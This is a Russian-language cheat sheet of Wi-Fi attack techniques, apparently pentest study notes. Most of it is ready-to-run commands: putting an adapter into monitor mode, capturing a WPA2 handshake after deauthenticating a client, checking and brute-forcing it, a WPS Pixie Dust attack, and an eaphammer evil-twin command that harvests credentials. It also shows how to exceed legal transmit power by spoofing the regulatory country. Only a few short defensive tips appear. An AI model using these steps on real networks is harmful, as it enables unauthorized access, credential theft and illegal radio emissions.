# Атаки

Переводим адаптер в режим монитора: \
`$ iwconfig` \
`$ airmon-ng start wlan4` \
Слушаем эфир: \
`$ airodump-ng wlan4mon`

## WPA/WPA2 PSK

Необходимое условие для атак на WPA/WPA2: должны быть клиенты в сети.

Для атаки на WPA2 нужно поймать и записать хэндшейк в файл и потом с ним работать. \
`$ airodump-ng wlan4mon -w OutFile --bssid 4C:5E:0C:22:8C:D3 -c 6` \
`-c` - какой канал слушаем (из предыдущей команды, столбец CH) \
`--bssid` - тоже из пред команды \
`wlan4mon` - интерфейс в режиме монитора

Чтобы поймать хендшейк, кто-то должен подключиться. Для этого можем с помощью разных методик отключить одного из пользователей: \
Классический способ: `$ airreplay-ng -0 100 -a 4C:5E:0C:22:8C:D3 -c 8C:FA:BA:9C:0A:B5 wlan4mon` \
\-a - bssid сети \
\-c - кого отключаем

Многие начинающие специалисты начинают сразу брутить. Это неправильно. Сначала надо проверить, подходит ли хендшейк для брута. Самый легкий вариант - утилита `cowpatty`: \
`$ cowpatty -c -r OutFile.cap` \
если выведет, что "Collected all neccery data...", то все норм, можно брутить.

С чем может быть связано, что плохой хендшейк? Ответ: записались в перемешку пакеты от разных хендшейков.\
Утилита `wpaclean` вырезает из записанного файла все лишнее (кроме самого хэндшейка)

Брут с помощью hashcat (Win | Linux)\
Атакующие, как правило, не используют свое оборудование для перехвати трафика, а используют, например, Rasberry Pi (навешивают антенны), и управляют с помощью утилиты `airserv-ng` \
Так же, используется усиление антенны (посмотреть текущее: iwconfig, Tx-Power, default 20dBm)

Сильный сигнал желателен для атаки на технологию WPS. Изменяем мощность антенны: \
`$ ifconfig wlan4 down` \
`$ iw reg set BZ # ставим страну Белиз. Для нее разрешено 30dBm` \
`$ iw reg get` \
`$ iwconfig wlan4 txpower 30` \
`$ ifconfig wlan4 up` \
`$ iwconfig # Видим, что сигнал увеличился`

Работаем с WPS: у `airodump` последней версии появилось два ключа полезных: \
`$ airodump-ng wlan4mon --wps --uptime` \
Столбец WPS показывает, включена ли WPS-технология \
При атаке на WPS актуально время работы точки: \
Появилась атака на WPS - Pixie \
В `reaver` есть поддержка этой атаки (ключ -K - это оффлайн брут WPS - попытка подобрать WPS pin ). Узнать, какое оборудование подвержено атаке этой: есть уже составляемые доки, например: WPS Pixie Dust Database

Совет по безопасности:

* Менять mac-адрес оборудования (bssid), потому что по дефолтному маку можно узнать тип оборудования и как-то уже планировать атаку
* Менять дефолтное имя оборудования, потому что по нему при WPS можно, в некоторых случаях, узнать PIN по умолчанию
* Менять PIN

## FakeAP/EvilTwin

Так можно атаковать WPA-EAP (WPA Enterprise)

Еще одна атака - `FakeAP/EvilTwin` - поднимаем фейковую точку, запускаем iptables, запускаем сервер. При подключении предлагается ввести пароль. Подключаем два адаптера беспроводных. Пример утилиты: `wifiphisher`

или `eaphammer`:

```
sudo ./eaphammer -i wlan1 --channel 48 --hw-mode a --auth wpa-eap --essid <wifi name> --creds
```

## Как это все обнаруживать, смотреть, защищать:&#x20;

WPS

* Использовать другой mac
* В идеале, вообще не использовать

Утилита `waidps` - утилита для обнаружения вторжения в сеть
